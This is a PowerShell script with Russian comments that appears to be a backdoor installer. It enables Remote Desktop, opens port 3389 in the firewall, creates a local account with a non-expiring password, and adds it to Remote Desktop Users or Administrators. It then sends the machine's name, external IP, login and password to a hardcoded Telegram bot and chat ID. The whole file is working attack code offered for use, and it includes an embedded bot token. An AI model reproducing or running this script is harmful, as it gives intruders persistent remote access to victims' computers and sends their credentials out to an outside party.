# ===== НАСТРОЙКИ =====
$Token = '5466273638:AAF5XEp-3IIgjsgOlV2YauFeSnBlAZeFe5M'
$ChatID = '5336455555'
$NewUser = ("rdp_" + $env:COMPUTERNAME).ToLower() -replace '[^a-z0-9_]', ''
$NewPass = -join ((33..126) | Get-Random -Count 16 | ForEach-Object {[char]$_})
# =====================

try {
    # 1. Включаем RDP в реестре
    $regPath = 'HKLM:\System\CurrentControlSet\Control\Terminal Server'
    Set-ItemProperty -Path $regPath -Name 'fDenyTSConnections' -Value 0 -Force -ErrorAction Stop
    
    # 2. Открываем порт в брандмауэре
    netsh advfirewall firewall add rule name='RDP-In' dir=in action=allow protocol=TCP localport=3389 -ErrorAction SilentlyContinue | Out-Null
    Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
    
    # 3. Создаём пользователя (только базовые параметры)
    if (!(Get-LocalUser -Name $NewUser -ErrorAction SilentlyContinue)) {
        $SecurePass = ConvertTo-SecureString $NewPass -AsPlainText -Force
        New-LocalUser -Name $NewUser -Password $SecurePass -ErrorAction Stop | Out-Null
        
        # Настраиваем свойства (только PasswordNeverExpires, без UserMayNotChangePassword)
        Set-LocalUser -Name $NewUser -PasswordNeverExpires $true -ErrorAction SilentlyContinue
        
        # Добавляем в группу для RDP
        Add-LocalGroupMember -Group 'Remote Desktop Users' -Member $NewUser -ErrorAction SilentlyContinue
        # Если группы нет — добавляем в админы
        if ($LASTEXITCODE -ne 0) {
            Add-LocalGroupMember -Group 'Administrators' -Member $NewUser -ErrorAction SilentlyContinue
        }
    }
    
    # 4. Получаем внешний IP
    $IP = (Invoke-RestMethod 'https://api.ipify.org?format=json' -ErrorAction SilentlyContinue).ip
    if (-not $IP) { $IP = 'unknown' }
    
    # 5. Формируем сообщение
    $Msg = "RDP-Ready|Host:" + $env:COMPUTERNAME + "|IP:" + $IP + "|Port:3389|Login:" + $NewUser + "|Pass:" + $NewPass
}
catch {
    $Msg = "ERR:" + $_.Exception.Message
}

# 6. Отправляем в Телеграм
$Url = "https://api.telegram.org/bot" + $Token + "/sendMessage?chat_id=" + $ChatID + "&text=" + [System.Web.HttpUtility]::UrlEncode($Msg)
Invoke-RestMethod $Url -ErrorAction SilentlyContinue | Out-Null
